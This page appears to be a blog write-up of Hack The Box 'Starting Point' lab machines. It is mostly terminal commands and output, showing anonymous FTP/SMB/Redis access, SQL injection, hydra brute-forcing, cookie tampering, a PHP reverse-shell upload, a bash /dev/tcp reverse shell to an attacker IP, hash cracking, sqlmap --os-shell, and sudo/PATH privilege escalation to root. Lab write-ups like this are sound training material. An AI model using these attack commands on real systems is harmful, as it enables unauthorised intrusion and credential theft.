---
permalink: /misc/htb/Starting-Point
title: Starting Point
---

<br>

# Meow

```
[connor@fedora Desktop]$ telnet 10.129.190.8  
Trying 10.129.190.8...  
Connected to 10.129.190.8.  
Escape character is '^]'.  
  
 █  █         ▐▌     ▄█▄ █          ▄▄▄▄  
 █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀  
 █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█  
  
  
Meow login: root  
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)  
...

root@Meow:~# cat flag.txt    
b40abdfe23665f766f9c61ecba8a4c19
```

<br>

# Fawn
<br>
ftp Anonymous user requires no password

```
[connor@fedora Desktop]$ ftp 10.129.249.105  
Connected to 10.129.249.105 (10.129.249.105).  
220 (vsFTPd 3.0.3)  
Name (10.129.249.105:connor): Anonymous  
331 Please specify the password.  
Password:  
230 Login successful.  
Remote system type is UNIX.  
Using binary mode to transfer files.  
ftp> get flag.txt  
local: flag.txt remote: flag.txt  
227 Entering Passive Mode (10,129,249,105,63,94).  
150 Opening BINARY mode data connection for flag.txt (32 bytes).  
226 Transfer complete.  
32 bytes received in 0.314 secs (0.10 Kbytes/sec)  
ftp> exit  
221 Goodbye.  
[connor@fedora Desktop]$ cat flag.txt    
035db21c881520061c53e0536e44f815[connor@fedora Desktop]$
```

<br>

# Dancing

```
[connor@fedora Desktop]$ smbclient -L 10.129.188.254  
Password for [SAMBA\connor]:  
  
       Sharename       Type      Comment  
       ---------       ----      -------  
       ADMIN$          Disk      Remote Admin  
       C$              Disk      Default share  
       IPC$            IPC       Remote IPC  
       WorkShares      Disk         
SMB1 disabled -- no workgroup available  
[connor@fedora Desktop]$ smbclient //10.129.188.254/WorkShares  
Password for [SAMBA\connor]:  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                   D        0  Mon Mar 29 18:22:01 2021  
 ..                                  D        0  Mon Mar 29 18:22:01 2021  
 Amy.J                               D        0  Mon Mar 29 19:08:24 2021  
 James.P                             D        0  Thu Jun  3 18:38:03 2021  
  
               5114111 blocks of size 4096. 1732182 blocks available  
smb: \> cd James.P\  
smb: \James.P\> ls  
 .                                   D        0  Thu Jun  3 18:38:03 2021  
 ..                                  D        0  Thu Jun  3 18:38:03 2021  
 flag.txt                            A       32  Mon Mar 29 19:26:57 2021  
  
               5114111 blocks of size 4096. 1732182 blocks available  
smb: \James.P\> get flag.txt  
getting file \James.P\flag.txt of size 32 as flag.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)  
smb: \James.P\> exit  
[connor@fedora Desktop]$ cat flag.txt    
5f61c10dffbc77a704d76016a22f1664[connor@fedora Desktop]$
```

<br>

# Redeemer
```
[connor@fedora Desktop]$ redis-cli -h 10.129.62.239  
10.129.62.239:6379> select 0  
OK  
(0.63s)  
10.129.62.239:6379> keys *  
1) "flag"  
2) "stor"  
3) "numb"  
4) "temp"  
(0.63s)  
10.129.62.239:6379> get flag  
"03e1d2b376c37ab3f5319922053953eb"  
10.129.62.239:6379>
```

<br>

# Appointment

Login as admin with SQL injection `admin'#`
<br>

# Sequel
```
[connor@fedora Desktop]$ mysql -h 10.129.211.162 -u root  
Welcome to the MariaDB monitor.  Commands end with ; or \g.  
Your MariaDB connection id is 38  
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10  
  
Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.  
  
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.  
  
MariaDB [(none)]> SHOW databases;  
+--------------------+  
| Database           |  
+--------------------+  
| htb                |  
| information_schema |  
| mysql              |  
| performance_schema |  
+--------------------+  
4 rows in set (0.316 sec)  
  
MariaDB [(none)]> USE htb;  
Reading table information for completion of table and column names  
You can turn off this feature to get a quicker startup with -A  
  
Database changed  
MariaDB [htb]> SHOW tables;  
+---------------+  
| Tables_in_htb |  
+---------------+  
| config        |  
| users         |  
+---------------+  
2 rows in set (0.316 sec)  
  
MariaDB [htb]> SELECT * FROM config;  
+----+-----------------------+----------------------------------+  
| id | name                  | value                            |  
+----+-----------------------+----------------------------------+  
|  1 | timeout               | 60s                              |  
|  2 | security              | default                          |  
|  3 | auto_logon            | false                            |  
|  4 | max_size              | 2M                               |  
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |  
|  6 | enable_uploads        | false                            |  
|  7 | authentication_method | radius                           |  
+----+-----------------------+----------------------------------+  
7 rows in set (0.319 sec)
```

<br>

# Crocodile

Access open ftp port and download files:

```
[connor@fedora Desktop]$ ftp 10.129.1.15  
Connected to 10.129.1.15 (10.129.1.15).  
220 (vsFTPd 3.0.3)  
Name (10.129.1.15:connor): Anonymous  
230 Login successful.  
Remote system type is UNIX.  
Using binary mode to transfer files.  
ftp> ls  
227 Entering Passive Mode (10,129,1,15,172,179).  
150 Here comes the directory listing.  
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist  
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd  
226 Directory send OK.  
ftp> get allowed.userlist  
local: allowed.userlist remote: allowed.userlist  
227 Entering Passive Mode (10,129,1,15,183,188).  
150 Opening BINARY mode data connection for allowed.userlist (33 bytes).  
226 Transfer complete.  
33 bytes received in 0.311 secs (0.11 Kbytes/sec)  
ftp> get allowed.userlist.passwd    
local: allowed.userlist.passwd remote: allowed.userlist.passwd  
227 Entering Passive Mode (10,129,1,15,156,204).  
150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).  
226 Transfer complete.  
62 bytes received in 0.31 secs (0.20 Kbytes/sec)  
ftp> exit  
221 Goodbye.  
[connor@fedora Desktop]$ cat allowed.userlist; cat allowed.userlist.passwd    
aron  
pwnmeow  
egotisticalsw  
admin  
root  
Supersecretpassword1  
@BaASD&9032123sADS  
rKXM59ESxesUFHAd
```

<br>

Now use the tool hydra for dictionary attack

```
[connor@fedora Desktop]$ hydra -L allowed.userlist -P allowed.userlist.passwd http-post-form://10.129.1.15/login.php:"Username=^USER^&Password=^PASS^&Submit=Login":"Incorrect"  
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).  
  
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-10 14:42:37  
[DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries (l:4/p:4), ~1 try per task  
[DATA] attacking http-post-form://10.129.1.15:80/login.php:Username=^USER^&Password=^PASS^&Submit=Login:Incorrect  
[80][http-post-form] host: 10.129.1.15   login: admin   password: rKXM59ESxesUFHAd  
1 of 1 target successfully completed, 1 valid password found  
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-10 14:42:42
```

we get  `login: admin   password: rKXM59ESxesUFHAd` 

<br>

# Oopsie

http://10.129.83.71/cdn-cgi/login/index.php

click login as guest

On chromium: inspect > application > cookies

click accounts and note &id=2 in url. Let's change it to 1. We see accessid = 34322

Click uploads and change role cookie to admin and user cookie to 34322. Refresh, and now we can upload a file.

We'll use a [php reverse shell](https://github.com/BlackArch/webshells/blob/master/php/php-reverse-shell.php)

```
nc -lvnp 1234
```

Then browse to http://10.129.83.71/uploads/php-reverse-shell.php and we'll get a shell.

get functional shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

<br>


```
www-data@oopsie:/$ cat /var/www/html/cdn-cgi/login  
cat /var/www/html/cdn-cgi/login  
cat: /var/www/html/cdn-cgi/login: Is a directory  
www-data@oopsie:/$ cat /var/www/html/cdn-cgi/login/db.php  
cat /var/www/html/cdn-cgi/login/db.php  
<?php  
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');  
?>

www-data@oopsie:/$ su robert  
su robert  
Password: M3g4C0rpUs3r!  
  
robert@oopsie:/$ cd  
cd  
robert@oopsie:~$ cat user.txt  
cat user.txt  
f2c74ee8db7983851ab2a96a44eb7981  
robert@oopsie:~$
```


<br>

```
robert@oopsie:~$ id  
id  
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```

<br>

We see the group bugtracker.  Let's search for this.

<https://linuxhint.com/two-dev-null-command-purpose/>

```
robert@oopsie:~$ find / -group bugtracker 2>/dev/null  
find / -group bugtracker 2>/dev/null  
/usr/bin/bugtracker  
robert@oopsie:~$ /usr/bin/bugtracker  
/usr/bin/bugtracker  
  
------------------  
: EV Bug Tracker :  
------------------  
  
Provide Bug ID: 123  
123  
---------------  
  
cat: /root/reports/123: No such file or directory  
  
robert@oopsie:~$
```

<br>

we find an application we can run and use to escalate privleges. it is using the cat command.

<br>

```
robert@oopsie:/$ echo "/bin/sh" > /tmp/cat  
echo "/bin/sh" > /tmp/cat  
robert@oopsie:/$ chmod +x /tmp/cat     
chmod +x /tmp/cat  
robert@oopsie:/$ export PATH=/tmp:$PATH  
export PATH=/tmp:$PATH  
robert@oopsie:/$ /usr/bin/bugtracker  
/usr/bin/bugtracker  
  
------------------  
: EV Bug Tracker :  
------------------  
  
Provide Bug ID: 123  
123  
---------------  
  
# whoami  
whoami  
root
# su  
su  
root@oopsie:/home/robert#
```


<br>

# Vaccine

From the ftp we can download a password protected zip file

```
[connor@fedora Desktop]$ ftp 10.129.198.87  
Connected to 10.129.198.87 (10.129.198.87).  
220 (vsFTPd 3.0.3)  
Name (10.129.198.87:connor): Anonymous  
331 Please specify the password.  
Password:  
230 Login successful.  
Remote system type is UNIX.  
Using binary mode to transfer files.  
ftp> ls  
227 Entering Passive Mode (10,129,198,87,41,27).  
150 Here comes the directory listing.  
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip  
226 Directory send OK.  
ftp> get backup.zip  
local: backup.zip remote: backup.zip  
227 Entering Passive Mode (10,129,198,87,39,229).  
150 Opening BINARY mode data connection for backup.zip (2533 bytes).  
226 Transfer complete.  
2533 bytes received in 0.316 secs (8.02 Kbytes/sec)  
ftp> exit  
221 Goodbye.  
[connor@fedora Desktop]$ unzip backup.zip    
Archive:  backup.zip  
[backup.zip] index.php password:    
  skipping: index.php               incorrect password  
  skipping: style.css               incorrect password
```

<br>

Crack with fcrackzip:

```
[connor@fedora Desktop]$ fcrackzip -D -u backup.zip -p rockyou.txt    
  
  
PASSWORD FOUND!!!!: pw == 741852963
```

<br>

unzip:

```
[connor@fedora Desktop]$ unzip backup.zip    
Archive:  backup.zip  
[backup.zip] index.php password:    
 inflating: index.php                  
 inflating: style.css                  
[connor@fedora Desktop]$ cat index.php    
<!DOCTYPE html>  
<?php  
session_start();  
 if(isset($_POST['username']) && isset($_POST['password'])) {  
   if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {  
     $_SESSION['login'] = "true";  
     header("Location: dashboard.php");  
   }  
 }  
?>  
<html lang="en" >  
<head>  
 <meta charset="UTF-8">  
 <title>MegaCorp Login</title>  
 <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,700" rel="stylesheet"><link rel="stylesheet" href="./style.css">  
  
</head>  
 <h1 align=center>MegaCorp Login</h1>  
<body>  
<!-- partial:index.partial.html -->  
<body class="align">  
  
 <div class="grid">  
  
   <form action="" method="POST" class="form login">  
  
     <div class="form__field">  
       <label for="login__username"><svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#user"></use></svg><span class="hidden">Username</span></label>  
       <input id="login__username" type="text" name="username" class="form__input" placeholder="Username" required>  
     </div>  
  
     <div class="form__field">  
       <label for="login__password"><svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#lock"></use></svg><span class="hidden">Password</span></label>  
       <input id="login__password" type="password" name="password" class="form__input" placeholder="Password" required>  
     </div>  
  
     <div class="form__field">  
       <input type="submit" value="Sign In">  
     </div>  
  
   </form>  
  
  
 </div>  
  
 <svg xmlns="http://www.w3.org/2000/svg" class="icons"><symbol id="arrow-right" viewBox="0 0 1792 1792"><path d="M1600 960q0 54-37 91l-651 651q-39 37-91 37-51 0-90-37l-75-75q-38-38-38-91t38-91l293-293H245q-52 0-84.5-37.5T128 1024V896q0  
-53 32.5-90.5T245 768h704L656 474q-38-36-38-90t38-90l75-75q38-38 90-38 53 0 91 38l651 651q37 35 37 90z"/></symbol><symbol id="lock" viewBox="0 0 1792 1792"><path d="M640 768h512V576q0-106-75-181t-181-75-181 75-75 181v192zm832 96v576q0 4  
0-28 68t-68 28H416q-40 0-68-28t-28-68V864q0-40 28-68t68-28h32V576q0-184 132-316t316-132 316 132 132 316v192h32q40 0 68 28t28 68z"/></symbol><symbol id="user" viewBox="0 0 1792 1792"><path d="M1600 1405q0 120-73 189.5t-194 69.5H459q-121  
0-194-69.5T192 1405q0-53 3.5-103.5t14-109T236 1084t43-97.5 62-81 85.5-53.5T538 832q9 0 42 21.5t74.5 48 108 48T896 971t133.5-21.5 108-48 74.5-48 42-21.5q61 0 111.5 20t85.5 53.5 62 81 43 97.5 26.5 108.5 14 109 3.5 103.5zm-320-893q0 159-11  
2.5 271.5T896 896 624.5 783.5 512 512t112.5-271.5T896 128t271.5 112.5T1280 512z"/></symbol></svg>  
  
</body>  
<!-- partial -->  
    
</body>  
</html>
```

<br>

md5 hash in this line:

```
if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") { 
```

<br>

crack with hashcat:

```
[connor@fedora Desktop]$ echo "2cb42f8734ea607eefed3b70af13bbd3" > hash  
[connor@fedora Desktop]$ hashcat -a 0 -m 0 hash rockyou.txt               
hashcat (v6.2.5) starting  
  
clGetDeviceIDs(): CL_DEVICE_NOT_FOUND  
  
clGetDeviceIDs(): CL_DEVICE_NOT_FOUND  
  
OpenCL API (OpenCL 2.0 pocl 1.8  Linux, RelWithDebInfo, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]  
=======================================================================================================================================  
* Device #1: pthread-Intel(R) Core(TM) i5-2520M CPU @ 2.50GHz, 2856/5777 MB (1024 MB allocatable), 4MCU  
  
OpenCL API (OpenCL 1.1 Mesa 22.1.3) - Platform #2 [Mesa]  
========================================================  
  
Minimum password length supported by kernel: 0  
Maximum password length supported by kernel: 256  
  
INFO: All hashes found in potfile! Use --show to display them.  
  
Started: Mon Jul 11 20:17:07 2022  
Stopped: Mon Jul 11 20:17:07 2022  
[connor@fedora Desktop]$ hashcat -a 0 -m 0 hash rockyou.txt --show  
2cb42f8734ea607eefed3b70af13bbd3:qwerty789
```

<br>

Next install a [cookie-editor](https://chrome.google.com/webstore/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm/related) extension.

Using it we see PHPSESSID=cn41f8psaek96dcg84ufs47a4g which is needed for authentication using sqlmap.


```
[connor@fedora Desktop]$ wget https://github.com/sqlmapproject/sqlmap/tarball/master  
  
[connor@fedora Desktop]$ tar -xvf master  

[connor@fedora Desktop]$ cd sqlmapproject-sqlmap-43fba39/  

[connor@fedora sqlmapproject-sqlmap-43fba39]$ sudo pip3 install sqlmap  

[connor@fedora Desktop]$ sqlmap -u 'http://10.129.198.87/dashboard.php?search=asdf' --cookie="PHPSESSID=cn41f8psaek9  
6dcg84ufs47a4g" --os-shell  
       ___  
      __H__  
___ ___[)]_____ ___ ___  {1.6.6#pip}  
|_ -| . [,]     | .'| . |  
|___|_  ["]_|_|_|__,|  _|  
     |_|V...       |_|   https://sqlmap.org  
  
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end u  
ser's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are no  
t responsible for any misuse or damage caused by this program  
  
[*] starting @ 21:24:21 /2022-07-11/  
  
[21:24:21] [INFO] resuming back-end DBMS 'postgresql'    
[21:24:21] [INFO] testing connection to the target URL  
sqlmap resumed the following injection point(s) from stored session:  
---  
Parameter: search (GET)  
   Type: boolean-based blind  
   Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)  
   Payload: search=asdf' AND (SELECT (CASE WHEN (4712=4712) THEN NULL ELSE CAST((CHR(75)||CHR(115)||CHR(88)||CHR(11  
7)) AS NUMERIC) END)) IS NULL-- kNjZ  
  
   Type: error-based  
   Title: PostgreSQL AND error-based - WHERE or HAVING clause  
   Payload: search=asdf' AND 8659=CAST((CHR(113)||CHR(106)||CHR(106)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (8659  
=8659) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(98)||CHR(112)||CHR(120)||CHR(113)) AS NUMERIC)-- pOrl  
  
   Type: stacked queries  
   Title: PostgreSQL > 8.1 stacked queries (comment)  
   Payload: search=asdf';SELECT PG_SLEEP(5)--  
  
   Type: time-based blind  
   Title: PostgreSQL > 8.1 AND time-based blind  
   Payload: search=asdf' AND 7046=(SELECT 7046 FROM PG_SLEEP(5))-- PCiV  
---  
[21:24:22] [INFO] the back-end DBMS is PostgreSQL  
web server operating system: Linux Ubuntu 19.10 or 20.10 or 20.04 (focal or eoan)  
web application technology: Apache 2.4.41  
back-end DBMS: PostgreSQL  
[21:24:22] [INFO] fingerprinting the back-end DBMS operating system  
[21:24:25] [INFO] the back-end DBMS operating system is Linux  
[21:24:27] [INFO] testing if current user is DBA  
[21:24:30] [INFO] retrieved: '1'  
[21:24:31] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution  
[21:24:31] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER  
os-shell>
```

Anddd we have a shell! SQLmap is overpowered.

To get a more stable shell:

```
[connor@fedora Desktop]$ sudo nc -lvnp 1234
```

then

```
os-shell> bash -c "bash -i >& /dev/tcp/10.10.16.3/1234 0>&1"
```

then

```
python3 -c 'import pty;pty.spawn("/bin/bash")' CTRL+Z 
stty raw -echo; fg; export TERM=xterm
```

<br>

```
[connor@fedora Desktop]$ sudo nc -lvnp 1234  
[sudo] password for connor:    
Ncat: Version 7.92 ( https://nmap.org/ncat )  
Ncat: Listening on :::1234  
Ncat: Listening on 0.0.0.0:1234  
Ncat: Connection from 10.129.219.213.  
Ncat: Connection from 10.129.219.213:50748.  
bash: cannot set terminal process group (1534): Inappropriate ioctl for device  
bash: no job control in this shell  
postgres@vaccine:/var/lib/postgresql/11/main$ python3 -c 'import pty;pty.spawn("/bin/bash")'    
<in$ python3 -c 'import pty;pty.spawn("/bin/bash")'    
postgres@vaccine:/var/lib/postgresql/11/main$ ^Z  
[1]+  Stopped                 sudo nc -lvnp 1234  
[connor@fedora Desktop]$ stty raw -echo; fg; export TERM=xterm  
sudo nc -lvnp 1234  
  
postgres@vaccine:/var/lib/postgresql/11/main$ cd ../../  
postgres@vaccine:/var/lib/postgresql$ ls  
11  user.txt
```

<br>

Now for privesc:<br>
The machine uses both PHP & SQL, so there should be cleartext creds in /var/www/html

```
postgres@vaccine:/var/www/html$ cat dashboard.php
```

in this we get 

`$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");`

<br>

The shell dies often but now that we have the password we can just use ssh.

```
[connor@fedora Desktop]$ ssh postgres@10.129.219.213  
postgres@10.129.219.213's password:    
  
postgres@vaccine:~$ sudo -l  
[sudo] password for postgres:    
Matching Defaults entries for postgres on vaccine:  
   env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH  
   XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,  
   mail_badpass  
  
User postgres may run the following commands on vaccine:  
   (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf  
postgres@vaccine:~$
```

<br>

So we can edit /etc/postgresql/11/main/pg_hba.conf 

```
postgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```


Then within vi, we can do 

```
:set shell=/bin/sh
:shell
```

<br>

And we have a root shell!

```
# cd /root  
# ls  
pg_hba.conf  root.txt  snap
```
